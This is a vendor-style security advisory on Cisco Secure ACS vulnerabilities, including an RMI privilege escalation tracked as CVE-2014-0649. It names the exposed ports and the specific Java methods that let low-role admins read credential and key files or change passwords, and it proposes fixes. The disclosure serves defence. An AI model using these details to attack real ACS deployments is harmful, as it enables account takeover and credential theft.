RNE: Summary: Cisco Secure Access Control System (ACS) is affected by the following vulnerabilities:      Cisco Secure ACS RMI Privilege Escalation Vulernability     Cisco Secure ACS RMI Unauthenticated User Access Vulnerability     Cisco Secure ACS Operating System Command Injection Vulnerability  Cisco Secure ACS uses the Remote Method Invocation (RMI) interface for internode communication using TCP ports 2020 and 2030.  These vulnerabilities are independent of each other; a release that is affected by one of the vulnerabilities may not be affected by the other.  Cisco has released free software updates that address these vulnerabilities. This advisory is available at the following link:  http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140115-csacs  Network-based mitigations for the RMI-based vulnerabilities are outlined in the Cisco Applied Mitigation Bulletin: Identifying and Mitigating the Multiple Vulnerabilities in Cisco Secure Access Control System http://tools.cisco.com/security/center/viewAMBAlert.x?alertId=32120  PSIRT Evaluation: The Cisco PSIRT has assigned this bug the following CVSS version 2 score. The Base and Temporal CVSS scores as of the time of evaluation are 8.5/7: http://tools.cisco.com/security/center/cvssCalculator.x?vector=AV:N/AC:M/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C&version=2.0 CVE ID CVE-2014-0649 has been assigned to document this issue. Additional information on Cisco's security vulnerability policy can be found at the following URL: http://www.cisco.com/en/US/products/products_security_vulnerability_policy.html
Description: A web admin user with any role (eg. ReadOnlyAdmin, ReportAdmin, etc) can perform administrative actions with SuperAdmin privileges via the Java RMI interface exposed by the ACS server on TCP/2020 and TCP/2030.Examples of these actions are found in RemoteReplicationManagementImpl.java and include:Promoting a secondary ACS to active    284     public void promote()Locking administrative web accounts including those with a SuperAdmin role    895     public void remoteUpdateAdminLogin()Changing an authenticating user's password    972     public void changeUserPassword()Locking an authenticating user's account    935     public void remoteUpdateUserFailedAttempt()Reading the database credentials file, the database key file, and the database cert file    396     public byte[] getCredFile()    426     public byte[] getKeyFile()    456     public byte[] getCertFile()At least two solutions exist:1) RMI authentication can be restricted to users with the SuperAdmin or SystemAdmin role. This should be reasonable as no other roles have the ability to configure a Distributed System environment and therefore do not need to authenticate via RMI.2) RMI authorization can be implemented on a per-Java method basis with the Java Authentication and Authorization Service (JAAS).
